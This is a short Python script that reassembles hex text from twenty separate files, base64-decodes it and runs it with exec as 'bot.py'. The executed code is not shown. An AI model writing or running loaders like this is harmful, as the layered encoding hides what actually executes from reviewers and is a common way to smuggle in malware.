# language: Python 3.11+
import base64
from pathlib import Path
raw=bytes.fromhex("".join(Path(__file__).with_name(f"h{i}.txt").read_text(encoding="utf-8") for i in range(20))).decode("utf-8")
exec(compile(base64.b64decode(raw),"bot.py","exec"),globals())
